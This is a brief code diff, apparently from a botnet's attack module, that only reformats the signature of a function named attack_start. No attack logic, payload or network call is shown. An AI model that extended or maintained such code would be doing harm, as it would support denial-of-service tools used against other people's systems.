@@ -152,7 +152,9 @@ void attack_parse(char *buf, int len)
         free_opts(opts, opts_len);
 }
 
-void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void attack_start(int duration, ATTACK_VECTOR vector,
+				  uint8_t targs_len, struct attack_target *targs,
+				  uint8_t opts_len, struct attack_option *opts)
 {
     int pid1, pid2;
 
